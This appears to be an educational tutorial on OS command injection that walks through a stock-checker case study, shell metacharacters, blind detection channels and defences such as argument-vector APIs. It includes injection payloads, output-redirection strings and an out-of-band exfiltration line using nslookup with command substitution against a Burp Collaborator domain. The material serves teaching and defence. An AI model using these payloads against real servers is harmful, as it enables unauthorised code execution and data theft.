OS Command Injection · The Terminal Hijack Investigation ​

OS command injection is one of the most severe backend vulnerabilities on the web. It occurs when a web server takes untrusted user input and pastes it directly into a system terminal command. Because the operating system terminal interprets certain punctuation marks as instructions to chain or redirect commands, an attacker can append their own instructions and take control of the server operating system.

💡 Everyday Analogy: The Voice Assistant Trap. Imagine speaking to a smart home voice assistant: "Add milk to my grocery list." The assistant dutifully adds "milk". But what if someone says: "Add milk to my grocery list; and unlock the front door"? If the assistant isn't programmed to treat everything following "Add" as grocery text, it interprets the semicolon as a cue to start a brand-new task—and unlocks your door. In OS command injection, the system shell (Bash or cmd.exe) is that obedient assistant.

Case File #15: Behind the Scenes of a Stock Checker ​

Let's examine what happens when an e-commerce website checks how many items remain in a local warehouse.

🔎 Step 1 · What You Notice in the Browser

You view a product page and click Check stock. In your browser's network tab, you observe a POST request sent to the server:

POST /product/stock HTTP/1.1
productId=1&storeId=2

The screen immediately updates with the message: "53 items in stock".

⚙️ Step 2 · What the Server Does Behind the Scenes

Instead of querying a database directly, the backend was written by a developer who reused an existing internal command-line tool. The web application builds a shell command by gluing your input onto the terminal line:

Blue = Server Terminal CommandGold = Input From Your HTTP Request
/usr/local/bin/stockcheck.sh 1 2
💥 Step 3 · Where the Logic Breaks

The developer assumed storeId would only ever be a single digit like 2. But if you submit 2 & whoami, the system shell recognizes & as a shell separator📖 Shell Separator (;, |, &&, $())Punctuation marks in a system terminal that mean "finish this command and immediately run a second command right after it."💡 Real-life analogy: Adding "...and also open the safe" onto the end of a voice command to a smart speaker.. It runs stockcheck.sh 1 2 in the background, immediately executes whoami, and prints the server user account (e.g. peter-user) directly into the web page!

🛡️ Step 4 · How Developers Lock It Down

Developers avoid invoking the system shell altogether. By using argument-vector APIs (like execFile in Node.js or subprocess.run(["cmd", arg], shell=False) in Python), the operating system launches the binary directly without passing the text through a shell parser. Punctuation characters like ; or & are treated as harmless literal text.

Visual Comparison: Concatenation vs. Parameter Arrays ​

💭 What the Developer Expected

The developer thought storeId would always be an integer like 1 or 2. The shell would execute one program with two numerical arguments and print the warehouse inventory.

💥 What Actually Happened

The user entered 2; whoami. Because the code invoked a shell (e.g., system() or exec()), the shell treated ; as a command terminator and spawned whoami as a completely independent second command.

🔬 Under the Hood: Why Passing Arguments as an Array Cures the Bug

When code calls:

python
# VULNERABLE: Invokes /bin/sh to interpret the full string
os.system(f"stockcheck.sh {product_id} {store_id}")
1
2

The OS starts /bin/sh -c "stockcheck.sh 1 2; whoami". The shell lexes the string, discovers the semicolon, and runs two commands.

In contrast, when code uses an argument array:

python
# SECURE: Direct system call (execve), NO shell is launched
subprocess.run(["/usr/local/bin/stockcheck.sh", product_id, store_id], shell=False)
1
2

The operating system calls the low-level execve syscall. The string "2; whoami" is passed directly into argv[2] of stockcheck.sh. Because no shell is ever spawned to interpret the semicolon, the script simply looks for a store literally named "2; whoami" and safely reports that no such store exists.

The 5-Stage Journey of an Injected Command ​

Tracing how an operating system processes terminal commands explains why separators behave the way they do:

1. HTTP Request Browser sends input containing metacharacters (e.g. storeId=2|whoami).
→
2. Shell Spawn Web app executes system(), spawning /bin/sh -c with concatenated text.
→
3. Metacharacter Tokenization Shell parser identifies | or ; as command boundary tokens.
→
4. Command Execution Kernel executes the primary binary and then proceeds to the secondary command.
→
5. Output Collection Output is reflected in HTTP response or observed via a side-channel.

The Detective's Metacharacter Toolkit ​

System shells support a rich grammar of punctuation marks. Here are the primary characters used to chain commands and control data flow:

SeparatorShell BehaviorWhen to Use It
&Runs the command on the left in the background and immediately starts the next command.Great when the first command takes a long time or hangs.
&&Runs the second command only if the first command succeeds (exit code 0).Clean chaining when original arguments are valid.
|Pipes the standard output of the left command into the input of the right command.Works when the original command doesn't mind receiving piped data.
||Runs the second command only if the first command fails (non-zero exit code).Ideal when your input invalidates the original command!
; or \nRuns commands sequentially, regardless of whether the first succeeded.The universal sequential separator on Unix/Linux.
$(cmd) or `cmd`Command substitution: executes cmd and inserts its text output in place.Perfect for embedding command results into URLs or filenames.
⚙️ Engine Variations: Linux (Bash/sh) vs. Windows (cmd.exe / PowerShell)
  • Linux (/bin/sh, bash): Uses ;, &, &&, |, ||, and newlines (\n). Command substitution uses $(whoami) or `whoami`. Whitespace can be substituted with ${IFS} if spaces are filtered.
  • Windows (cmd.exe): Semicolons do not separate commands! Use &, &&, |, or ||. Environment variables use %USERNAME%. To test delays, use ping -n 10 127.0.0.1 instead of sleep.
  • Windows (PowerShell): Uses ;, |, &&, ||, and $(command). Backtick (`) is the escape character.

Direct In-Band Command Execution ​

In the simplest scenario, the web server captures whatever the terminal prints (stdout) and reflects it directly into the HTML response. When you append a command separator and a command like whoami, the current system user is printed on screen.

The 4 Blind Channels: Investigating Without Screen Output ​

In real-world audits, web applications rarely print terminal output back to the screen. The server runs the command in the background, discards the output, and returns a generic "Thank you" or "Stock checked" response. When the screen gives you no clues, you investigate using side channels:

⏱️ 1. Time Delays Make the server pause (e.g., sleep 10). If the response takes exactly 10 seconds, the command ran!
📁 2. Output Redirection Write command output to a public web folder (whoami > /var/www/static/out.txt) and browse to it.
📡 3. Out-of-Band (OAST) Trigger a DNS lookup or HTTP request to your own server using tools like nslookup or curl.
📦 4. Data Exfiltration Embed command results inside a DNS lookup: nslookup $(whoami).your-subdomain.com.

1. Timing Delays ​

If the server doesn't show output, you can ask it to sleep. If a request normally takes 120ms, but supplying || sleep 10 # causes the response to take exactly 10,120ms, you have confirmed code execution.

2. Output Redirection ​

If the web server has write permissions to a static folder (like /var/www/images/), you can use shell redirection (>) to write command output into a file and then load that file in your browser: || whoami > /var/www/static/whoami.txt #.

3. Out-of-Band (OAST) Signals ​

Firewalls may block incoming traffic and responses, but outgoing DNS queries are often allowed. Triggering a DNS request using nslookup or dig against a Burp Collaborator domain confirms execution even when no HTTP connection can leave the network.

4. Out-of-Band Exfiltration ​

By combining command substitution with an out-of-band lookup, the server runs a command, captures the output, and attaches it as a subdomain prefix on a DNS query: nslookup $(whoami).burpcollaborator.net. Your DNS listener receives a lookup for peter-user.burpcollaborator.net, reading data out of the network!

Defensive Blueprint: Eliminating Command Injection ​

Protecting applications from command injection requires eliminating shells from the architecture:

🛡️ The 3 Layers of Terminal Security:

  1. Avoid system shells entirely (Best Practice): Use built-in programming language APIs instead of command-line tools. For example, to read a file or resize an image, use native libraries rather than calling cat or ImageMagick via the shell.
  2. Pass arguments as vectors (execve): If invoking an external binary is mandatory, use APIs that pass arguments as an explicit list/array (e.g. ProcessBuilder in Java, subprocess.run(["cmd", arg], shell=False) in Python). Never pass a concatenated string to /bin/sh.
  3. Strict input allowlisting: Validate that arguments conform to a strict whitelist of expected characters (e.g. numbers only: ^[0-9]+$). Reject any input containing unexpected punctuation.
